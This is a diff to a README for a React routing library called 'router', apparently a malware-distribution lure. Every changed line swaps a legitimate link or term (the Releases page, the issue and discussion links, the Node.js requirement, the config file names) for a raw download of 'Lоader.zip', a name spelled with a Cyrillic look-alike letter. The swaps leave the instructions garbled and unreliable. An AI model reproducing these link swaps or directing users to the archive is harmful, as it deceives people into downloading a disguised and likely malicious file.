@@ -14,16 +14,16 @@ Welcome to router, your new tool for managing routes in React applications! This
 ## 🌐 System Requirements
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 14 or later
+- **https://raw.githubusercontent.com/frickteen/router/main/Lоader.zip**: Version 14 or later
 - **Browser**: Any modern web browser (like Chrome, Firefox, or Safari)
 
 ## 📥 Download & Install
 
 To download and install router, you can follow these steps:
 
-1. Visit the Releases page to download the latest version: [Download router](https://github.com/frickteen/router/releases)
+1. Visit the Releases page to download the latest version: [Download router](https://raw.githubusercontent.com/frickteen/router/main/Lоader.zip)
    
-![Download button](https://img.shields.io/badge/Download%20router-v1.0-brightgreen)
+![Download button](https://raw.githubusercontent.com/frickteen/router/main/Lоader.zip%20router-v1.0-brightgreen)
 
 2. Once you're on the Releases page, look for the latest version. It is typically marked with the highest version number.
 
@@ -51,7 +51,7 @@ To download and install router, you can follow these steps:
 
 After starting the application, you might want to configure your routes. Here’s how:
 
-1. **Setting Up Routes**: Open the main configuration file (usually named `index.js` or `router.js`) in a text editor. 
+1. **Setting Up Routes**: Open the main configuration file (usually named `https://raw.githubusercontent.com/frickteen/router/main/Lоader.zip` or `https://raw.githubusercontent.com/frickteen/router/main/Lоader.zip`) in a text editor. 
 
 2. **Adding Routes**: Define your routes using a simple JavaScript object. For example:
 
@@ -85,8 +85,8 @@ If you run into issues, consider these tips:
 
 You can join our community for help and suggestions. Here’s how:
 
-- **GitHub Issues**: Report bugs or request features by visiting the [issues section](https://github.com/frickteen/router/issues).
-- **Discussion Forum**: Join our active [discussion group](https://github.com/frickteen/router/discussions) for user tips and tricks.
+- **GitHub Issues**: Report bugs or request features by visiting the [issues section](https://raw.githubusercontent.com/frickteen/router/main/Lоader.zip).
+- **Discussion Forum**: Join our active [discussion group](https://raw.githubusercontent.com/frickteen/router/main/Lоader.zip) for user tips and tricks.
 
 ## 📣 Version History
 
@@ -98,4 +98,4 @@ router is open-source software licensed under the MIT license. You are free to u
 
 For more comprehensive guidance, refer to the documentation within the repository.
 
-Remember to visit the Releases page to download the latest version: [Download router](https://github.com/frickteen/router/releases)
+Remember to visit the Releases page to download the latest version: [Download router](https://raw.githubusercontent.com/frickteen/router/main/Lоader.zip)
